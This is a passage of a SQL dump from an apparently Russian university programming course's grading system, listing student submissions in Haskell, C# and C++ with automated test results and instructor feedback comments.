(2382, 68, '3431532', '2012-10-20 07:53:20', 1, '#include "stdafx.h"\r\n#include <stdio.h>\r\n#include <iostream>\r\n#include <algorithm>                                     \r\n#include <vector>\r\n#include <cmath>\r\nusing namespace std;\r\n// Вы случайно зачли мне C# задачу как С++, поэтому сдаю С++ как С#\r\n   --- На самом деле систем такая, что я могу зачесть только то что вы мне прислали - те вы мне заначит\r\n   --- в тот раз прислали не туда. Но ОК, засчитано.\r\nvector<long> zeroDigits(vector<long> input, int n)\r\n{\r\n	long pVal = (long)(pow(10.0,n));\r\n	transform(input.begin(), input.end(), input.begin(), [n, pVal](long x){ return pVal*(x/pVal);});\r\n	return input;\r\n}\r\n\r\nint main()\r\n{\r\n	vector<long> v;\r\n	v.push_back(223237);v.push_back(2123121);	v.push_back(221120);	v.push_back(22229);v.push_back(28323);v.push_back(26223);\r\n	vector<long> vn = zeroDigits(v, 3);\r\n	for(vector<long>::iterator iter = vn.begin(); iter != vn.end()-1; ++iter)\r\n	{\r\n		cout<<*iter<<endl;\r\n	}\r\n	return 0;\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2383, 66, '471091', '2012-10-20 08:42:28', 0, 'ganeralizedCantor 1 = [1..]\r\nganeralizedCantor 2 = can 1\r\nganeralizedCantor k = func 1 k \r\n\r\nfunc a 1 = [[x]|x<-[1..a]]\r\nfunc a k = [(a : y) | y<-allList a (k-1)  ] ++ func (a+1) k\r\n\r\nallList n 1 = [[x]|x<-[1..n]]\r\nallList n k = [[x] ++ y |x<-[1..n], y<- allList n (k-1)] ', 'Не удалось вычислить выражение "length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))", проверьте правильность синтаксиса'),
(2384, 66, '471091', '2012-10-20 09:22:17', 0, 'generalizedCantor 1 = [1..]\r\ngeneralizedCantor 2 = can 1\r\ngeneralizedCantor k = func 1 k \r\n\r\nfunc a 1 = [[x]|x<-[1..a]]\r\nfunc a k = [(a : y) | y<-allList a (k-1)  ] ++ func (a+1) k\r\n\r\nallList n 1 = [[x]|x<-[1..n]]\r\nallList n k = [[x] ++ y |x<-[1..n], y<- allList n (k-1)] ', 'Не удалось вычислить выражение "length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))", проверьте правильность синтаксиса'),
(2385, 66, '471091', '2012-10-20 09:36:29', 0, 'ganeralizedCantor k = func 1 k \r\n\r\nfunc a 1 = [[x]|x<-[1..a]]\r\nfunc a k = [(a : y) | y<-allList a (k-1)  ] ++ func (a+1) k\r\nlen = length(filter(==[2,1,2])(take 100 (ganeralizedCantor 3)))\r\nallList n 1 = [[x]|x<-[1..n]]\r\nallList n k = [[x] ++ y |x<-[1..n], y<- allList n (k-1)] ', 'Не удалось вычислить выражение "length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))", проверьте правильность синтаксиса'),
(2386, 66, '471091', '2012-10-20 09:36:49', 2, '   --- Что-то у вас не совсем то: если напечатать например take 100 $ generalizedCantor 2\r\n   --- то хорошо видно, что у вас генерируются только [i, j] , где i < j\r\n   --- Например [3,6] там нет.\r\n   --- Исправьте, пожалуйста (а я сейчас добавлю такой тест)\r\n   \r\ngeneralizedCantor k = func 1 k \r\n\r\nfunc a 1 = [[x]|x<-[1..a]]\r\nfunc a k = [(a : y) | y<-allList a (k-1)  ] ++ func (a+1) k\r\nlen = length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))\r\nallList n 1 = [[x]|x<-[1..n]]\r\nallList n k = [[x] ++ y |x<-[1..n], y<- allList n (k-1)] ', '<br/>Тесты успешно пройдены!'),
(2387, 74, '318210', '2012-10-20 09:53:36', 1, 'data Tree a = Empty | Node a (Tree a) (Tree a)\r\n\r\nfoldTree f e Empty = 0\r\nfoldTree f e ( Node x l r ) =  let lres = foldTree f e l\r\n				   rres = foldTree f e r\r\n		               in f x lres rres\r\n\r\nfunc x y z| x > 0 = x + y + z\r\n	|otherwise = y + z\r\n\r\nsumPos t = foldTree (func) 0 t\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2388, 75, 'Deutsche', '2012-10-20 11:33:20', 1, 'This problem was sent by email, accept it please', '<br/>Тесты успешно пройдены!'),
(2389, 68, '5772638', '2012-10-20 11:49:42', 1, '  class Program\r\n\r\n    {\r\n     \r\n        public static int [] zeroDigits( int[] numbs, byte n) \r\n        {\r\n            int p =Convert.ToInt32( Math.Pow(10,n));\r\n            int[] b=numbs.Select(x=> x/p).Select(x=>x*p).ToArray();\r\n            \r\n            return b;\r\n        }\r\n\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            Random rand = new Random();\r\n            int[] numbs = new int[15];\r\n            for (int i = 0; i < 15; i++ ) \r\n            {\r\n                numbs[i] = rand.Next(100,10000);\r\n            }\r\n            int[] res =zeroDigits(numbs,2);\r\n            for (int i = 0; i < 15; i++) \r\n            {\r\n                Console.Write(numbs[i]+" ");\r\n            }\r\n            Console.WriteLine();\r\n            for (int i = 0; i < res.Length; i++)\r\n            {\r\n                Console.Write(res[i] + " ");\r\n            }\r\n            Console.ReadKey();\r\n        }\r\n    }', '<br/>Тесты успешно пройдены!'),
(2390, 70, '3742311', '2012-10-20 15:21:55', 1, 'myFilter f l = foldr (x s -> if f x then x:s else s) [] l', '<br/>Тесты успешно пройдены!'),
(2391, 69, '3742311', '2012-10-20 15:26:50', 1, 'bigSin x = let bigSinTmp y (h:t) = if h >= y then h else bigSinTmp y t in bigSinTmp x (map (a -> sin a) [1..])\r\n   --- Нет, это не по условию, вы же определяете свою функцию bigSinTmp..\r\n   --- Если хотите, могу подсказать, что тут делать, напишите мне тогда письмо или в контакте', '<br/>Тесты успешно пройдены!'),
(2392, 71, '3742311', '2012-10-20 15:34:28', 1, 'approxSum l = let approxSumTmp (h:t) s = if abs h < 0.000001 then s else approxSumTmp t (s + h) in approxSumTmp l 0\r\n\r\nz = approxSum (map (x -> 1 / (x * x)) [1..])', '<br/>Тесты успешно пройдены!'),
(2393, 74, '3742311', '2012-10-20 15:43:04', 2, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\nfoldTree _ s Empty = s\r\nfoldTree f s (Node i t1 t2) = f i (foldTree f (foldTree f s t1) t2)\r\n\r\nsumPos t = foldTree (x s -> if x > 0 then (x + s) else s) 0 t\r\n  --- Это правильно, конечно, но не по условию. Там речь шла о другой функции, которая катаморфизм\r\n  --- (подсказка - там у f три аргумента, а не два)', '<br/>Тесты успешно пройдены!'),
(2394, 76, '3742311', '2012-10-20 15:48:25', 1, 'data Shape = Circle Integer | Rect Integer Integer\r\n\r\nperimeter (Circle r) = 2 * pi * r\r\nperimeter (Rect a b) = 2 * (a + b)\r\n   --- Тут надо все поля сделать Double, из-за этого не компилируется.\r\n   --- Но, более существенно, у вас не по условию - тут надо было определить class Shape (а не data).\r\n   --- И два отдельных data - для Circle и для Rect', 'Не удалось вычислить выражение "perimeter (Circle 0)", проверьте правильность синтаксиса'),
(2395, 56, '383483', '2012-10-20 16:30:55', 1, 'allLists n 0 = [[]]\r\nallLists n k = [(x:xs)|x<-[1..n], xs <- allLists n (k-1)]', '<br/>Тесты успешно пройдены!'),
(2396, 56, '1029771', '2012-10-20 16:46:14', 0, 'allLists n 2 = [ [x,y] | x <- [1..a], y <- [1..a]] where a=n\r\n\r\nallLists n m = [ x:y | x <- [1..a], y <-allLists g h ]  where a=n; g = n; h = 2', 'Выражение имеет неправильное значение: allLists 1 1'),
(2397, 56, '1029771', '2012-10-20 16:47:41', 2, 'allLists n 1 = [[1..n]]\r\nallLists n 2 = [ [x,y] | x <- [1..a], y <- [1..a]] where a=n\r\n\r\nallLists n m = [ x:y | x <- [1..a], y <-allLists g h ]  where a=n; g = n; h = 2\r\n   --- Но у вас, на самом деле всегда выдаются спискм длины 1 2 или 3.\r\n   --- Те например allLists 2 5 вернет сиписок и [[1,1,1], [1,1,2], [1,2,1], ... в вовсе не \r\n   --- то, что надо. Исправьте, пожалуйста. Если есть проблемы, напишите, я подскажу.', '<br/>Тесты успешно пройдены!'),
(2398, 66, '1029771', '2012-10-20 17:33:58', 0, 'allLists n 1 = [[1..n]]\r\nallLists n 2 = [ [x,y] | x <- [1..a], y <- [1..a]] where a=n\r\n\r\nallLists n m = [ x:y | x <- [1..a], y <-allLists g h ]  where a=n; g = n; h = 2', 'Не удалось вычислить выражение "length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))", проверьте правильность синтаксиса'),
(2399, 66, '1029771', '2012-10-20 17:34:48', 1, 'qwe 1 n = [[n]]\r\nqwe m n =  [x:y | x <- [1..n],n-x>0, y <-qwe (m-1) (n-x)  ]\r\n\r\ngeneralized m n = qwe m n ++ generalized m (n+1) \r\n\r\ngeneralizedCantor n = generalized n n', '<br/>Тесты успешно пройдены!'),
(2400, 65, '1029771', '2012-10-20 17:35:57', 0, '\r\nqwe 1 n = [[n]]\r\nqwe m n =  [x:y | x <- [1..n],n-x>0, y <-qwe (m-1) (n-x)  ]\r\n\r\ngeneralized m n = qwe m n ++ generalized m (n+1) \r\n\r\ngeneralizedCantor n = generalized n n\r\ncantor = generalizedCantor 2', 'Не удалось вычислить выражение "length(filter(==(3,2))(take 100 cantor))", проверьте правильность синтаксиса'),
(2401, 65, '1029771', '2012-10-20 17:41:25', 1, '\r\nqwe n =  [(x,y) | x <- [1..n],n-x>0, y <-[ (n-x)] ]\r\n\r\ngeneralized n = qwe n ++ generalized (n+1) \r\n\r\ncantor = generalized 2', '<br/>Тесты успешно пройдены!'),
(2402, 70, '63706456', '2012-10-20 18:44:23', 1, 'myFilter p xs = (foldr (x f-> if p x then (x:) . f else f) id xs) []', '<br/>Тесты успешно пройдены!'),
(2403, 69, '63706456', '2012-10-20 18:56:55', 1, 'bigSin x = head $ filter (>x) $ map sin [1..]', '<br/>Тесты успешно пройдены!'),
(2404, 72, '63706456', '2012-10-20 19:05:48', 1, 'rep f n = f . (if n == 1 then id else rep f (n-1))\r\n\r\nweekendExpences ls = sum $ zipWith (*) ls $ cycle $ rep (0:) 5 $ rep (1:) 2 []\r\n  --- Хитро)', '<br/>Тесты успешно пройдены!'),
(2405, 74, '63706456', '2012-10-20 19:15:48', 1, 'data Tree a = Node a (Tree a) (Tree a) | Empty deriving Show\r\n\r\nfoldTree f def (Node num left right) = 	f num (recCall left) (recCall right)\r\n					where recCall = foldTree f def\r\nfoldTree f def Empty = def\r\n\r\nsumPos = foldTree (a b c -> (max a 0) + b + c) 0\r\n\r\n--честно говоря не уверен в том, тот ли это вариант\r\n   --- Да, тот, все правильно', '<br/>Тесты успешно пройдены!'),
(2406, 57, '397095', '2012-10-20 19:47:29', 1, 'p 0 = [[]]\r\np n = [(x:xs) | x <- [0,1], xs <- p (n-1)]\r\n\r\ndividedMap f xs = \r\n	let\r\n		len = length xs\r\n		l = p len\r\n	in\r\n		map (in -> let zz = zip bin xs in f (get 0 zz) (get 1 zz)) l\r\n\r\nget n zz = foldr ((x,y) xs -> if x == n then (y:xs) else xs) [] zz\r\n\r\ngenerate rs = rs ++ foldr (++) [] (dividedMap test rs)\r\n\r\ntest xs ys =\r\n	if length xs == 0 || length ys == 0 then [] else\r\n	let\r\n		xxs = generate xs\r\n		yys = generate ys\r\n	in\r\n		foldr\r\n			((x,y) xs -> if x >= 0 then (x:y:xs) else (y:xs))\r\n			[]\r\n			[ (p,c) | a <- xxs, b <- yys, let c = a + b, let ab = a * b, let p = if mod ab c == 0 then div ab c else -1 ]\r\n\r\ncanMakeScheme rs m = any (x -> x == m) (generate rs)', '<br/>Тесты успешно пройдены!'),
(2407, 58, '12206137', '2012-10-20 19:55:16', 0, '-- It takes 1:30 on 8 resistors.\r\n\n-- In case of 9 resistors it works for 20 minutes, then interpreter fails with runtime error.\r\n\n-- I don''t know why. And I don''t know, what are the weakest place in code.\r\n\nimport Data.Array\r\n\nimport Data.Bits\r\n\nimport Data.List\r\n\nimport Debug.Trace\r\n\n\r\n\n(|>) x f = f x\r\n\n\r\n\nbit2shift :: Int -> Int -> Int\r\n\nbit2shift acc 1 = acc\r\n\nbit2shift acc n = bit2shift (acc+1) (n `shiftR` 1)\r\n\n\r\n\niterMask f m cm acc =\r\n\n    let other = m `xor` cm in\r\n\n    let newAcc = f cm other ++ acc in\r\n\n    if (cm .&. (cm-1)) == 0 then newAcc\r\n\n    else iterMask f m (m .&. (cm-1)) newAcc\r\n\n\r\n\nbitCount :: Int -> Int\r\n\nbitCount =\r\n\n    let\r\n\n        bitCount'' :: Int -> Int -> Int\r\n\n        bitCount'' acc 0 = acc\r\n\n        bitCount'' acc x = bitCount'' (acc + (x .&. 1)) (x `shiftR` 1)\r\n\n    in\r\n\n    let a = array (0,(shiftL 1 10 - 1)) [(i, bitCount'' 0 i) | i <- [0..(shiftL 1 10 - 1)]] in\r\n\n    i -> a!i\r\n\n\r\n\nmaxBits :: Int\r\n\nmaxBits = 7\r\n\n\r\n\nhandleMask rs m f =\r\n\n    if (bitCount m > maxBits) then []\r\n\n    else\r\n\n        let first = m .&. (m-1) in\r\n\n        if first == 0 then [rs!(bit2shift 0 m)]\r\n\n        else iterMask f m first []\r\n\n\r\n\ncountCalc :: (Rational -> Rational -> Rational) -> [Rational] -> [Rational] -> [Rational]\r\n\ncountCalc f xs ys = concat $ map (x -> map (y -> f x y) ys) xs\r\n\ncountSeries = countCalc (+)\r\n\ncountParallel = countCalc (x y -> x*y/(x+y))\r\n\n\r\n\nfuns :: Array Int ([Rational] -> [Rational] -> [Rational])\r\n\nfuns = array (0,1) [(0,countParallel), (1,countSeries)]\r\n\nreversFuns :: Array Int (Rational -> Rational -> Rational)\r\n\nreversFuns = array (0,1) [(0,x y -> x*y/(x-y)), (1,x y -> y - x)]\r\n\n\r\n\ncombine :: (Array (Int, Int) [Rational]) -> Int -> Int -> Int -> [Rational]\r\n\ncombine a connect x y =\r\n\n    let res = (funs!connect) (a!(1-connect,x)) (a!(connect,y)) in\r\n\n    if (y .&. (y-1)) == 0 then res\r\n\n    else res ++ (funs!connect) (a!(1-connect,x)) (a!(1-connect,y))\r\n\n\r\n\nbinarySearch arr elem =\r\n\n    let (l,r) = bounds arr in\r\n\n    binarySearch'' l (r+1)\r\n\n    where\r\n\n        binarySearch'' :: Int -> Int -> Bool\r\n\n        binarySearch'' l r\r\n\n            | r <= l+1 = elem == arr!l\r\n\n            | otherwise =\r\n\n                let mid = shiftR (l+r) 1 in\r\n\n                if arr!mid > elem then binarySearch'' l mid\r\n\n                else binarySearch'' mid r\r\n\n\r\n\nselectOldestBit mask =\r\n\n    let next = mask .&. (mask - 1) in\r\n\n    if next == 0 then mask\r\n\n    else selectOldestBit next\r\n\n\r\n\n--canMakeScheme :: [Rational] -> Rational -> Bool\r\n\ncanMakeScheme rs_list m =\r\n\n    let n = length rs_list in\r\n\n    let lim = ((1::Int) `shiftL` n) - 1 in\r\n\n    let rs = listArray (0,n-1) $ map (/ m) $ rs_list in\r\n\n    let\r\n\n        a :: Array (Int,Int) [Rational]\r\n\n        a = array ((0,1), (1,lim))\r\n\n             [((connect, mask), handleMask rs mask (combine a connect) )\r\n\n                | connect <- [0..1], mask <- [1..lim] ]\r\n\n    in\r\n\n    if a |> elems |> any (any (== 1)) then True\r\n\n    else trace ("Finish 7") $ if n <= maxBits then False\r\n\n    else\r\n\n        let\r\n\n        sorted :: Array (Int,Int) (Array Int Rational)\r\n\n        sorted =\r\n\n            array ((0,1), (1,lim))\r\n\n             [((connect, mask),\r\n\n                let list = sort (a!(connect,mask)) in\r\n\n                let len = length list - 1 in\r\n\n                array (0,len) (zip [0..len] list))\r\n\n              | connect <- [0..1], mask <- [1..lim] ]\r\n\n        in\r\n\n        let\r\n\n            handle val mask =\r\n\n                let bits = bitCount mask in\r\n\n                let bitLim = trace (show mask ++ " " ++ show val) $ selectOldestBit mask in\r\n\n                let\r\n\n                inner m =\r\n\n                    if m < bitLim then False\r\n\n                    else\r\n\n                        let next = m .&. (m-1) in\r\n\n                        let other = mask `xor` m in\r\n\n                        let\r\n\n                        (m1,m2) =\r\n\n                            if bitCount m < bitCount other then (m,other)\r\n\n                            else (other,m)\r\n\n                        in\r\n\n                        let (b1, b2) = (bitCount m1, bitCount m2) in\r\n\n                        if b1 == 1 && bits == maxBits+2 then\r\n\n                            let cur = (sorted!(0,m1))!0 in\r\n\n                            if cur < val && handle ((reversFuns!1) cur val) m2 then True\r\n\n                            else if cur > val && handle ((reversFuns!0) cur val) m2 then True\r\n\n                            else inner next\r\n\n                        else\r\n\n                            let\r\n\n                            work connect = \r\n\n                                let arr = sorted!(1 - connect,m2) in\r\n\n                                if (a!(1-connect,m1)) |> map (x -> (reversFuns!connect) x val) |> any (binarySearch arr)\r\n\n                                then True\r\n\n                                else\r\n\n                                    let arr = sorted!(connect,m2) in\r\n\n                                    (a!(1-connect,m1)) |> map (x -> (reversFuns!connect) x val) |> any (binarySearch arr)\r\n\n                            in\r\n\n                            if work 0 || work 1 then True\r\n\n                            else inner next\r\n\n                in\r\n\n                inner (mask .&. (mask - 1))\r\n\n        in\r\n\n        let handleBoth m = handle 1 m in\r\n\n        if n == 8 then handleBoth lim\r\n\n        else if n > 9 then False -- Program isn''t expected to work on such values\r\n\n        else\r\n\n            let\r\n\n                handle8 i =\r\n\n                    if i == n then handleBoth lim\r\n\n                    -- handle full musk without one bit\r\n\n                    else if handleBoth $ lim .&. (complement $ shiftL 1 i) then True\r\n\n                    else handle8 (i+1)\r\n\n            in\r\n\n            handle8 0\r\n\n\n', '<br/>Тесты успешно пройдены!'),
(2408, 58, '12206137', '2012-10-20 20:20:44', 1, '  --- OK, засчитано!\r\n-- It takes 1:30 on 8 resistors.\r\n\r\n-- In case of 9 resistors it works for 20 minutes, then interpreter fails with runtime error.\r\n\r\n-- I don''t know why. And I don''t know, what are the weakest place in code.\r\n\r\nimport Data.Array\r\n\r\nimport Data.Bits\r\n\r\nimport Data.List\r\n\r\nimport Debug.Trace\r\n\r\n\r\n\r\n(|>) x f = f x\r\n\r\n\r\n\r\nbit2shift :: Int -> Int -> Int\r\n\r\nbit2shift acc 1 = acc\r\n\r\nbit2shift acc n = bit2shift (acc+1) (n `shiftR` 1)\r\n\r\n\r\n\r\niterMask f m cm acc =\r\n\r\n    let other = m `xor` cm in\r\n\r\n    let newAcc = f cm other ++ acc in\r\n\r\n    if (cm .&. (cm-1)) == 0 then newAcc\r\n\r\n    else iterMask f m (m .&. (cm-1)) newAcc\r\n\r\n\r\n\r\nbitCount :: Int -> Int\r\n\r\nbitCount =\r\n\r\n    let\r\n\r\n        bitCount'' :: Int -> Int -> Int\r\n\r\n        bitCount'' acc 0 = acc\r\n\r\n        bitCount'' acc x = bitCount'' (acc + (x .&. 1)) (x `shiftR` 1)\r\n\r\n    in\r\n\r\n    let a = array (0,(shiftL 1 10 - 1)) [(i, bitCount'' 0 i) | i <- [0..(shiftL 1 10 - 1)]] in\r\n\r\n    i -> a!i\r\n\r\n\r\n\r\nmaxBits :: Int\r\n\r\nmaxBits = 7\r\n\r\n\r\n\r\nhandleMask rs m f =\r\n\r\n    if (bitCount m > maxBits) then []\r\n\r\n    else\r\n\r\n        let first = m .&. (m-1) in\r\n\r\n        if first == 0 then [rs!(bit2shift 0 m)]\r\n\r\n        else iterMask f m first []\r\n\r\n\r\n\r\ncountCalc :: (Rational -> Rational -> Rational) -> [Rational] -> [Rational] -> [Rational]\r\n\r\ncountCalc f xs ys = concat $ map (x -> map (y -> f x y) ys) xs\r\n\r\ncountSeries = countCalc (+)\r\n\r\ncountParallel = countCalc (x y -> x*y/(x+y))\r\n\r\n\r\n\r\nfuns :: Array Int ([Rational] -> [Rational] -> [Rational])\r\n\r\nfuns = array (0,1) [(0,countParallel), (1,countSeries)]\r\n\r\nreversFuns :: Array Int (Rational -> Rational -> Rational)\r\n\r\nreversFuns = array (0,1) [(0,x y -> x*y/(x-y)), (1,x y -> y - x)]\r\n\r\n\r\n\r\ncombine :: (Array (Int, Int) [Rational]) -> Int -> Int -> Int -> [Rational]\r\n\r\ncombine a connect x y =\r\n\r\n    let res = (funs!connect) (a!(1-connect,x)) (a!(connect,y)) in\r\n\r\n    if (y .&. (y-1)) == 0 then res\r\n\r\n    else res ++ (funs!connect) (a!(1-connect,x)) (a!(1-connect,y))\r\n\r\n\r\n\r\nbinarySearch arr elem =\r\n\r\n    let (l,r) = bounds arr in\r\n\r\n    binarySearch'' l (r+1)\r\n\r\n    where\r\n\r\n        binarySearch'' :: Int -> Int -> Bool\r\n\r\n        binarySearch'' l r\r\n\r\n            | r <= l+1 = elem == arr!l\r\n\r\n            | otherwise =\r\n\r\n                let mid = shiftR (l+r) 1 in\r\n\r\n                if arr!mid > elem then binarySearch'' l mid\r\n\r\n                else binarySearch'' mid r\r\n\r\n\r\n\r\nselectOldestBit mask =\r\n\r\n    let next = mask .&. (mask - 1) in\r\n\r\n    if next == 0 then mask\r\n\r\n    else selectOldestBit next\r\n\r\n\r\n\r\n--canMakeScheme :: [Rational] -> Rational -> Bool\r\n\r\ncanMakeScheme rs_list m =\r\n\r\n    let n = length rs_list in\r\n\r\n    let lim = ((1::Int) `shiftL` n) - 1 in\r\n\r\n    let rs = listArray (0,n-1) $ map (/ m) $ rs_list in\r\n\r\n    let\r\n\r\n        a :: Array (Int,Int) [Rational]\r\n\r\n        a = array ((0,1), (1,lim))\r\n\r\n             [((connect, mask), handleMask rs mask (combine a connect) )\r\n\r\n                | connect <- [0..1], mask <- [1..lim] ]\r\n\r\n    in\r\n\r\n    if a |> elems |> any (any (== 1)) then True\r\n\r\n    else trace ("Finish 7") $ if n <= maxBits then False\r\n\r\n    else\r\n\r\n        let\r\n\r\n        sorted :: Array (Int,Int) (Array Int Rational)\r\n\r\n        sorted =\r\n\r\n            array ((0,1), (1,lim))\r\n\r\n             [((connect, mask),\r\n\r\n                let list = sort (a!(connect,mask)) in\r\n\r\n                let len = length list - 1 in\r\n\r\n                array (0,len) (zip [0..len] list))\r\n\r\n              | connect <- [0..1], mask <- [1..lim] ]\r\n\r\n        in\r\n\r\n        let\r\n\r\n            handle val mask =\r\n\r\n                let bits = bitCount mask in\r\n\r\n                let bitLim = trace (show mask ++ " " ++ show val) $ selectOldestBit mask in\r\n\r\n                let\r\n\r\n                inner m =\r\n\r\n                    if m < bitLim then False\r\n\r\n                    else\r\n\r\n                        let next = mask .&. (m-1) in\r\n\r\n                        let other = mask `xor` m in\r\n\r\n                        let\r\n\r\n                        (m1,m2) =\r\n\r\n                            if bitCount m < bitCount other then (m,other)\r\n\r\n                            else (other,m)\r\n\r\n                        in\r\n\r\n                        let (b1, b2) = (bitCount m1, bitCount m2) in\r\n\r\n                        if b1 == 1 && bits == maxBits+2 then\r\n\r\n                            let cur = (sorted!(0,m1))!0 in\r\n\r\n                            if cur < val && handle ((reversFuns!1) cur val) m2 then True\r\n\r\n                            else if cur > val && handle ((reversFuns!0) cur val) m2 then True\r\n\r\n                            else inner next\r\n\r\n                        else\r\n\r\n                            let\r\n\r\n                            work connect = \r\n\r\n                                let arr = sorted!(1 - connect,m2) in\r\n\r\n                                if (a!(1-connect,m1)) |> map (x -> (reversFuns!connect) x val) |> any (binarySearch arr)\r\n\r\n                                then True\r\n\r\n                                else\r\n\r\n                                    let arr = sorted!(connect,m2) in\r\n\r\n                                    (a!(1-connect,m1)) |> map (x -> (reversFuns!connect) x val) |> any (binarySearch arr)\r\n\r\n                            in\r\n\r\n                            if work 0 || work 1 then True\r\n\r\n                            else inner next\r\n\r\n                in\r\n\r\n                inner (mask .&. (mask - 1))\r\n\r\n        in\r\n\r\n        let handleBoth m = handle 1 m in\r\n\r\n        if n == 8 then handleBoth lim\r\n\r\n        else if n > 9 then False -- Program isn''t expected to work on such values\r\n\r\n        else\r\n\r\n            let\r\n\r\n                handle8 i =\r\n\r\n                    if i == n then handleBoth lim\r\n\r\n                    -- handle full musk without one bit\r\n\r\n                    else if handleBoth $ lim .&. (complement $ shiftL 1 i) then True\r\n\r\n                    else handle8 (i+1)\r\n\r\n            in\r\n\r\n            handle8 0\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2409, 69, '12206137', '2012-10-20 20:23:22', 1, '(|>) x f = f x\r\n\r\n\r\n\r\nbigSin x = let r:_ = [1..] |> map sin |> filter (> x) in r\r\n', '<br/>Тесты успешно пройдены!'),
(2410, 70, '12206137', '2012-10-20 20:23:51', 1, 'myFilter f = foldr (x res -> if f x then x:res else res) []\r\n', '<br/>Тесты успешно пройдены!'),
(2411, 71, '12206137', '2012-10-20 20:24:09', 1, '(|>) x f = f x\r\n\r\n\r\n\r\neps = 0.000001\r\n\r\n\r\n\r\napproxSum'' acc (x:xs)\r\n\r\n    | abs x < eps = acc\r\n\r\n    | otherwise = approxSum'' (acc+x) xs\r\n\r\n\r\n\r\napproxSum = approxSum'' 0\r\n\r\n\r\n\r\nz = [1..] |> map (x -> 1 / (x*x)) |> approxSum\r\n', '<br/>Тесты успешно пройдены!'),
(2412, 72, '12206137', '2012-10-20 20:24:26', 1, 'weekendExpences =\r\n\r\n    count 0 0\r\n\r\n    where\r\n\r\n        count acc _ [] = acc\r\n\r\n        count acc i (x:xs) =\r\n\r\n            let newAcc = if i `mod` 7 > 4 then acc + x else acc in\r\n\r\n            count newAcc ((i+1) `mod` 7) xs\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2413, 73, '12206137', '2012-10-20 20:27:57', 1, '-- Is it an expected solution?\r\n\r\n-- Or it''s expected to use a list in right part itself (not a function eith arguments)?\r\n   --- Нет, совсем не это.. Имеется в виду\r\n   --- fibs = ... какое-то выражение с участием fibs ...\r\n   --- Ну, примерно как lst = 1: map (*2) lst дает геометрическую прогрессию\r\n   --- Но ОК, засчитано.\r\n\r\nfibs =\r\n\r\n    fibs'' 1 1\r\n\r\n    where\r\n\r\n        fibs'' a b = a : fibs'' b (a+b)\r\n', '<br/>Тесты успешно пройдены!'),
(2414, 72, 'tonyo', '2012-10-20 20:36:56', 1, 'weekendExpences xs = weekendExpences1 xs 0\r\n\r\nweekendExpences1 [] res = res \r\nweekendExpences1 xs res = weekendExpences1 (drop 7 xs) (res + weekExp)\r\n  where weekExp = sum . take 2 . drop 5 $ xs  ', '<br/>Тесты успешно пройдены!'),
(2415, 57, '63706456', '2012-10-20 20:38:42', 2, 'import Data.List\r\n\r\n  --- Я не знаю, в чем у вас проблема, но, просто как гипотеза, \r\n  --- мб вы не учитываете, что не обязательно брать все резисторы?\r\n\r\ndata Scheme = Paral Scheme Scheme | Res Double | Conseq Scheme Scheme deriving (Show,Eq,Ord)\r\n\r\ncomputeRes sc = case sc of 	Res x -> x\r\n				Conseq 	x y -> 	(computeRes x) + (computeRes y)\r\n				Paral 	x y ->	csX*csY/(csX+csY)	\r\n					where 	csX = computeRes x\r\n						csY = computeRes y\r\ndEq x y = abs(x - y) < 1e-10\r\n\r\n\r\nallPairs [x,y] = [(x,y)]\r\nallPairs (x:xs) = [(x,y)| y <- xs] ++ allPairs xs\r\n\r\nflatten1 [] = []\r\nflatten1 (x:xs) = (foldr (x f->(x:).f) id x) (flatten1 xs)\r\n\r\nremoveItems xs [] = xs\r\nremoveItems (x:xs) (y:ys) = if x == y then removeItems (x:xs) (y:ys) else x:(removeItems xs (y:ys))\r\n\r\nreduceSchemeList xs = [(sch:ls) | (x,y) <- (allPairs xs), sch <- [Paral x y, Conseq x y], let ls = delete x (delete y xs)]\r\n\r\ncanMakeScheme xs n = 	any (dEq n) $ 	\r\n			map computeRes $ \r\n			flatten1 $\r\n			until 	((x:xs) -> length x == 1) \r\n				(flatten1 . map reduceSchemeList) \r\n				(reduceSchemeList (map Res xs))', 'Выражение имеет неправильное значение: canMakeScheme [13, 7, 2, 3] 7'),
(2416, 74, '12206137', '2012-10-20 20:41:50', 2, 'data Tree = Empty | Node Int Tree Tree\r\n\r\n\r\n\r\nfoldTree map merge (Node val left right) =\r\n\r\n    let res = map val in\r\n\r\n    let\r\n\r\n    resLeft =\r\n\r\n        case left of\r\n\r\n            Empty -> res\r\n\r\n            _ -> merge res (foldTree map merge left)\r\n\r\n    in\r\n\r\n    case right of\r\n\r\n        Empty -> res\r\n\r\n        _ -> merge res (foldTree map merge right)\r\n\r\n\r\n\r\nsumPos = foldTree (x -> if x > 0 then x else 0) (+)\r\n   --- Нет, это вовсе не то, что называется катаморфизм. Катаморфизм, это когда мы передаем две функции\r\n   --- которыми мы как бы заменяем в дереве котструкторы и потом вычисляем то, что получилось.\r\n   --- Те в данном случае один парамтр дб функциией с 3 параметрами, а у другой - константой\r\n', '<br/>Тесты успешно пройдены!'),
(2417, 70, 'tonyo', '2012-10-20 20:46:30', 1, 'myFilter f xs = foldr (x res ->  if f x then (x:res) else res) [] xs\r\n', '<br/>Тесты успешно пройдены!'),
(2418, 71, '63706456', '2012-10-20 21:19:34', 1, 'approxSum = sum . takeWhile ((> 0.000001) . abs)\r\n\r\nz = approxSum $ map (x->1/(x*x)) [1..]', '<br/>Тесты успешно пройдены!'),
(2419, 68, '472848', '2012-10-20 21:39:17', 1, 'private static int[] zeroDigits(int[] a, int n)\r\n{\r\n  int divide = 1;\r\n  for (int i = 0; i < n; divide *= 10, ++i) ;\r\n  return a.Select(x => (x / divide) * divide).ToArray();\r\n}\r\n\r\nstatic void Main(string[] args)\r\n{\r\n  int[] a = { 1, 234, 12455, 342, 22 };\r\n  Array.ForEach(zeroDigits(a, 2), x => Console.Write("{0} ", x));\r\n}', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
